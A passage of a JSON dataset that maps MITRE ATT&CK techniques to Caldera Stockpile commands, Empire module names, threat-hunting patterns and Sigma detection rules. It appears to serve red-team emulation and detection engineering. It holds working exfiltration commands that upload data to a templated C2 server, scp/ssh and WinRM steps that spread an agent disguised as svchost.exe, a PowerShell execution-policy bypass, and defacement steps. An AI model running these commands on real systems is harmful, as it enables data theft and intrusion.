ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group} -executors pwsh\" -WindowStyle hidden;\n", "cleanup": "rm PowerShellCore.msi;\n"}}}], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1041", "commands": [{"source": "data/abilities/exfiltration/ea713bc4-63f0-491c-9a6f-0b01d560b87e.yml", "command": {"darwin": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "linux": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "windows": {"psh,pwsh": {"command": "$ErrorActionPreference = 'Stop';\n$fieldName = '#{host.dir.compress}';\n$filePath = '#{host.dir.compress}';\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();\n"}}}, "name": "Exfil the staged directory"}], "parsed_datasets": [{"Mitre Stockpile - Exfil the staged directory": {"id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e", "name": "Exfil staged directory", "description": "Exfil the staged directory", "tactic": "exfiltration", "technique": {"attack_id": "T1041", "name": "Exfiltration Over Command and Control Channel"}, "platforms": {"darwin": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "linux": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "windows": {"psh,pwsh": {"command": "$ErrorActionPreference = 'Stop';\n$fieldName = '#{host.dir.compress}';\n$filePath = '#{host.dir.compress}';\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.dir.compress"}]}]}}], "command_list": [{"darwin": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "linux": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "windows": {"psh,pwsh": {"command": "$ErrorActionPreference = 'Stop';\n$fieldName = '#{host.dir.compress}';\n$filePath = '#{host.dir.compress}';\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();\n"}}}], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1491", "commands": [{"source": "data/abilities/impact/3b007f46-23e7-4a11-9c14-e7085b6a754a.yml", "command": {"darwin": {"osa": {"command": "quit app \"Microsoft Outlook.app\""}}}, "name": "Quit Outlook"}, {"source": "data/abilities/impact/47d08617-5ce1-424a-8cc5-c9c978ce6bf9.yml", "command": {"darwin": {"sh": {"command": "echo \"proof that this machine was hacked.\" > message.txt\n"}}, "linux": {"sh": {"command": "echo \"proof that this machine was hacked.\" > message.txt\n"}}, "windows": {"psh": {"command": "Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'\n"}}}, "name": "Create a text file for the user to find"}, {"source": "data/abilities/impact/68235976-2404-42a8-9105-68230cfef562.yml", "command": {"windows": {"psh,pwsh": {"command": ".\\Invoke-MemeKatz.ps1\n", "payloads": ["Invoke-MemeKatz.ps1"]}, "cmd": {"command": "powershell.exe -ep bypass -c \"Invoke-MemeKatz.ps1\"\n", "payloads": ["Invoke-MemeKatz.ps1"]}}}, "name": "Downloads random meme and sets as desktop background"}], "parsed_datasets": [{"Mitre Stockpile - Quit Outlook": {"id": "3b007f46-23e7-4a11-9c14-e7085b6a754a", "name": "Quit Outlook", "description": "Quit Outlook", "tactic": "impact", "technique": {"attack_id": "T1491", "name": "Service Stop"}, "platforms": {"darwin": {"osa": {"command": "quit app \"Microsoft Outlook.app\""}}}}}, {"Mitre Stockpile - Create a text file for the user to find": {"id": "47d08617-5ce1-424a-8cc5-c9c978ce6bf9", "name": "Leave note", "description": "Create a text file for the user to find", "tactic": "impact", "technique": {"attack_id": "T1491", "name": "Defacement"}, "platforms": {"darwin": {"sh": {"command": "echo \"proof that this machine was hacked.\" > message.txt\n"}}, "linux": {"sh": {"command": "echo \"proof that this machine was hacked.\" > message.txt\n"}}, "windows": {"psh": {"command": "Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'\n"}}}}}, {"Mitre Stockpile - Downloads random meme and sets as desktop background": {"id": "68235976-2404-42a8-9105-68230cfef562", "name": "Invoke-MemeKatz", "description": "Downloads random meme and sets as desktop background", "tactic": "impact", "technique": {"attack_id": "T1491", "name": "Defacement"}, "platforms": {"windows": {"psh,pwsh": {"command": ".\\Invoke-MemeKatz.ps1\n", "payloads": ["Invoke-MemeKatz.ps1"]}, "cmd": {"command": "powershell.exe -ep bypass -c \"Invoke-MemeKatz.ps1\"\n", "payloads": ["Invoke-MemeKatz.ps1"]}}}}}], "command_list": [{"darwin": {"osa": {"command": "quit app \"Microsoft Outlook.app\""}}}, {"darwin": {"sh": {"command": "echo \"proof that this machine was hacked.\" > message.txt\n"}}, "linux": {"sh": {"command": "echo \"proof that this machine was hacked.\" > message.txt\n"}}, "windows": {"psh": {"command": "Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'\n"}}}, {"windows": {"psh,pwsh": {"command": ".\\Invoke-MemeKatz.ps1\n", "payloads": ["Invoke-MemeKatz.ps1"]}, "cmd": {"command": "powershell.exe -ep bypass -c \"Invoke-MemeKatz.ps1\"\n", "payloads": ["Invoke-MemeKatz.ps1"]}}}], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1492", "commands": [{"source": "data/abilities/impact/55f9600a-756f-496b-b27f-682052dc429c.yml", "command": {"darwin": {"sh": {"command": "./mission.go -duration 60 -extension .caldera -dir '/'", "payloads": ["mission.go"]}}, "linux": {"sh": {"command": "./mission.go -duration 60 -extension .caldera -dir '/'", "payloads": ["mission.go"]}}, "windows": {"cmd": {"command": "copy mission.go mission.exe &&mission.exe -duration 60 -extension .caldera -dir C:\\", "payloads": ["mission.go"]}, "psh": {"command": "mv mission.go mission.exe;.\\mission.exe -duration 60 -extension .caldera -dir 'C:\\';", "payloads": ["mission.go"]}}}, "name": "Hunts for files of a certain extension and inserts a message"}], "parsed_datasets": [{"Mitre Stockpile - Hunts for files of a certain extension and inserts a message": {"description": "Hunts for files of a certain extension and inserts a message", "id": "55f9600a-756f-496b-b27f-682052dc429c", "name": "File Hunter Mission", "platforms": {"darwin": {"sh": {"command": "./mission.go -duration 60 -extension .caldera -dir '/'", "payloads": ["mission.go"]}}, "linux": {"sh": {"command": "./mission.go -duration 60 -extension .caldera -dir '/'", "payloads": ["mission.go"]}}, "windows": {"cmd": {"command": "copy mission.go mission.exe &&mission.exe -duration 60 -extension .caldera -dir C:\\", "payloads": ["mission.go"]}, "psh": {"command": "mv mission.go mission.exe;.\\mission.exe -duration 60 -extension .caldera -dir 'C:\\';", "payloads": ["mission.go"]}}}, "tactic": "impact", "technique": {"attack_id": "T1492", "name": "Stored Data Manipulation"}}}], "command_list": [{"darwin": {"sh": {"command": "./mission.go -duration 60 -extension .caldera -dir '/'", "payloads": ["mission.go"]}}, "linux": {"sh": {"command": "./mission.go -duration 60 -extension .caldera -dir '/'", "payloads": ["mission.go"]}}, "windows": {"cmd": {"command": "copy mission.go mission.exe &&mission.exe -duration 60 -extension .caldera -dir C:\\", "payloads": ["mission.go"]}, "psh": {"command": "mv mission.go mission.exe;.\\mission.exe -duration 60 -extension .caldera -dir 'C:\\';", "payloads": ["mission.go"]}}}], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1184", "commands": [{"source": "data/abilities/lateral-movement/10a9d979-e342-418a-a9b0-002c483e0fa6.yml", "command": {"darwin": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", "cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", "payloads": ["sandcat.go-darwin"]}}, "linux": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", "cleanup": "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", "payloads": ["sandcat.go-linux"]}}}, "name": "Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication"}], "parsed_datasets": [{"Mitre Stockpile - Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication": {"id": "10a9d979-e342-418a-a9b0-002c483e0fa6", "name": "Start 54ndc47", "description": "Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication", "tactic": "lateral-movement", "technique": {"attack_id": "T1184", "name": "SSH Hijacking"}, "platforms": {"darwin": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", "cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", "payloads": ["sandcat.go-darwin"]}}, "linux": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", "cleanup": "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", "payloads": ["sandcat.go-linux"]}}}}}], "command_list": [{"darwin": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", "cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", "payloads": ["sandcat.go-darwin"]}}, "linux": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", "cleanup": "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", "payloads": ["sandcat.go-linux"]}}}], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1021", "commands": [{"source": "data/abilities/lateral-movement/41bb2b7a-75af-49fd-bd15-6c827df25921.yml", "command": {"windows": {"psh": {"command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} -executors psh}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "cleanup": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "payloads": ["sandcat.go-windows"]}}}, "name": "Start Agent using WinRM (WinRM)"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/lateral_movement/multi/ssh_command", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/lateral_movement/multi/ssh_command", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/lateral_movement/multi/ssh_launcher", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/lateral_movement/multi/ssh_launcher", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre Stockpile - Start Agent using WinRM (WinRM)": {"id": "41bb2b7a-75af-49fd-bd15-6c827df25921", "name": "Start Agent (WinRM)", "description": "Start Agent using WinRM (WinRM)", "tactic": "lateral-movement", "technique": {"attack_id": "T1021", "name": "Remote Services"}, "platforms": {"windows": {"psh": {"command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} -executors psh}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "cleanup": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "payloads": ["sandcat.go-windows"]}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/lateral_movement/multi/ssh_command", "ATT&CK Technique #1": "T1021", "ATT&CK Technique #2": "", "Technique": "Remote Services", "Concatenate for Python Dictionary": "\"python/lateral_movement/multi/ssh_command\":  [\"T1021\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/lateral_movement/multi/ssh_launcher", "ATT&CK Technique #1": "T1021", "ATT&CK Technique #2": "", "Technique": "Remote Services", "Concatenate for Python Dictionary": "\"python/lateral_movement/multi/ssh_launcher\":  [\"T1021\"],"}}], "command_list": [{"windows": {"psh": {"command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} -executors psh}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "cleanup": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "payloads": ["sandcat.go-windows"]}}}, "python/lateral_movement/multi/ssh_command", "python/lateral_movement/multi/ssh_command", "python/lateral_movement/multi/ssh_launcher", "python/lateral_movement/multi/ssh_launcher"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Netsh RDP Port Forwarding", "id": "782d6f3e-4c5d-4b8c-92a3-1d05fed72e63", "description": "Detects netsh commands that configure a port forwarding of port 3389 used for RDP", "references": ["https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html"], "date": "2019/01/29", "tags": ["attack.lateral_movement", "attack.t1021", "car.2013-07-002"], "status": "experimental", "author": "Florian Roth", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["netsh i* p*=3389 c*"]}, "condition": "selection"}, "falsepositives": ["Legitimate administration"], "level": "high"}}]}, {"technique_id": "T1129", "commands": [{"source": "Threat Hunting Tables", "command": "control.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "malware.dll", "name": "loaded_dll"}, {"source": "Threat Hunting Tables", "command": "rundll32.exe", "name": "sub_process_1"}], "parsed_datasets": [{"Threat Hunting Tables": {"chain_id": "100015", "os": "windows", "parent_process": "control.exe", "commandline_string": "", "sub_process_1": "rundll32.exe", "sub_process_2": "", "loaded_dll": "malware.dll", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "module_load", "mitre_attack": "T1129", "itw_sample": ""}}], "command_list": ["control.exe", "malware.dll", "rundll32.exe"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1043", "commands": [{"source": "Threat Hunting Tables", "command": "!=powershell.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "nslookup", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "!=cmd.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "nslookup", "name": "sub_process_1"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_sshcommand", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_sshcommand", "name": "Empire Module Command"}], "parsed_datasets": [{"Threat Hunting Tables": {"chain_id": "100051", "os": "windows", "parent_process": "!=powershell.exe", "commandline_string": "", "sub_process_1": "nslookup", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "commonly_used_port", "mitre_attack": "T1043", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100052", "os": "windows", "parent_process": "!=cmd.exe", "commandline_string": "", "sub_process_1": "nslookup", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "commonly_used_port", "mitre_attack": "T1043", "itw_sample": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/lateral_movement/invoke_sshcommand", "ATT&CK Technique #1": "T1043", "ATT&CK Technique #2": "", "Technique": "Commonly Used Port", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_sshcommand\":  [\"T1043\"],"}}], "command_list": ["!=powershell.exe", "nslookup", "!=cmd.exe", "nslookup", "powershell/lateral_movement/invoke_sshcommand", "powershell/lateral_movement/invoke_sshcommand"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Possible DNS Tunneling", "id": "1ec4b281-aa65-46a2-bdae-5fd830ed914e", "status": "experimental", "description": "Normally, DNS logs contain a limited amount of different dns queries for a single domain. This rule detects a high amount of queries for a single domain, which can be an indicator that DNS is used to transfer data.", "references": ["https://zeltser.com/c2-dns-tunneling/", "https://patrick-bareiss.com/detect-c2-traffic-over-dns-using-sigma/"], "author": "Patrick Bareiss", "date": "2019/04/07", "logsource": {"product": "dns"}, "detection": {"selection": {"parent_domain": "*"}, "condition": "selection | count(dns_query) by parent_domain > 1000"}, "falsepositives": ["Valid software, which uses dns for transferring data"], "level": "high", "tags": ["attack.t1043"]}}, {"data_source": {"title": "Suspicious Typical Malware Back Connect Ports", "id": "4b89abaa-99fe-4232-afdd-8f9aa4d20382", "status": "experimental", "description": "Detects programs that connect to typical malware back connect ports based on statistical analysis from two different sandbox system databases", "references": ["https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo"], "author": "Florian Roth", "date": "2017/03/19", "tags": ["attack.command_and_control", "attack.t1043"], "logsource": {"product": "windows", "service": "sysmon", "definition": "Use the following config to generate the necessary Event ID 10 Process Access events: <ProcessAccess onmatch=\"include\"><CallTrace condition=\"contains\">VBE7.DLL</CallTrace></ProcessAccess><ProcessAccess onmatch=\"exclude\"><CallTrace condition=\"excludes\">UNKNOWN</CallTrace></ProcessAccess>"}, "detection": {"selection": {"EventID": 3, "Initiated": "true", "DestinationPort": ["4443", "2448", "8143", "1777", "1443", "243", "65535", "13506", "3360", "200", "198", "49180", "13507", "6625", "4444", "4438", "1904", "13505", "13504", "12102", "9631", "5445", "2443", "777", "13394", "13145", "12103", "5552", "3939", "3675", "666", "473", "5649", "4455", "4433", "1817", "100", "65520", "1960", "1515", "743", "700", "14154", "14103", "14102", "12322", "10101", "7210", "4040", "9943"]}, "filter1": {"Image": "*\\Program Files*"}, "filter2": {"DestinationIp": ["10.*", "192.168.*", "172.16.*", "172.17.*", "172.18.*", "172.19.*", "172.20.*", "172.21.*", "172.22.*", "172.23.*", "172.24.*", "172.25.*", "172.26.*", "172.27.*", "172.28.*", "172.29.*", "172.30.*", "172.31.*", "127.*"], "DestinationIsIpv6": "false"}, "condition": "selection and not ( filter1 or filter2 )"}, "falsepositives": ["unknown"], "level": "medium"}}]}, {"technique_id": "T1131", "commands": [{"source": "SysmonHunter - Authentication Package", "command": "\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Authentication Packages", "name": null}, {"source": "SysmonHunter - Authentication Package", "command": "\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Authentication Packages", "name": null}], "parsed_datasets": [{"SysmonHunter - T1131": {"name": "Authentication Package", "description": null, "level": "medium", "phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Authentication Packages"}}}, {"type": "process", "process": {"cmdline": {"pattern": "\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Authentication Packages"}}}]}}], "command_list": ["\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Authentication Packages", "\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Authentication Packages"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (registry_key_path contains \"*\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\*\")and (process_path !contains \"C:\\\\WINDOWS\\\\system32\\\\lsass.exe\"or process_path !contains \"C:\\\\Windows\\\\system32\\\\svchost.exe\"or process_path !contains \"C:\\\\Windows\\\\system32\\\\services.exe\")", "name": "Authentication Package"}], "possible_detections": []}, {"technique_id": "T1182", "commands": [{"source": "SysmonHunter - AppCert DLLs", "command": "\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs", "name": null}, {"source": "SysmonHunter - AppCert DLLs", "command": "\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs", "name": null}], "parsed_datasets": [{"SysmonHunter - T1182": {"name": "AppCert DLLs", "description": null, "level": "medium", "phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs"}}}, {"type": "process", "process": {"cmdline": {"pattern": "\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs"}}}]}}], "command_list": ["\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs", "\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and registry_key_path contains \"\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\AppCertDlls\\\\\"", "name": "AppCert DLLs"}], "possible_detections": []}, {"technique_id": "C1000", "commands": [{"source": "SysmonHunter - Registry Execution", "command": "\\\\Windows\\\\.+\\\\reg.exe", "name": null}], "parsed_datasets": [{"SysmonHunter - C1000": {"name": "Registry Execution", "description": null, "level": "medium", "phase": "Execution", "query": [{"type": "process", "process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\reg.exe", "flag": "regex"}}}]}}], "command_list": ["\\\\Windows\\\\.+\\\\reg.exe"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "C1001", "commands": [{"source": "SysmonHunter - Lateral Movement", "command": "nbtscan.exe|psexec", "name": null}, {"source": "SysmonHunter - Lateral Movement", "command": "net|user|add", "name": null}, {"source": "SysmonHunter - Lateral Movement", "command": "net|/add", "name": null}], "parsed_datasets": [{"SysmonHunter - C1001": {"name": "Lateral Movement", "description": null, "level": "high", "phase": "Lateral Movement", "query": [{"type": "process", "process": {"image": {"pattern": "nbtscan.exe|psexec"}}}, {"type": "process", "process": {"cmdline": {"pattern": "net|user|add", "op": "and"}}}, {"type": "process", "process": {"cmdline": {"pattern": "net|/add", "op": "and"}}}]}}], "command_list": ["nbtscan.exe|psexec", "net|user|add", "net|/add"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "C1002", "commands": [{"source": "SysmonHunter - .Net Environment Execution", "command": 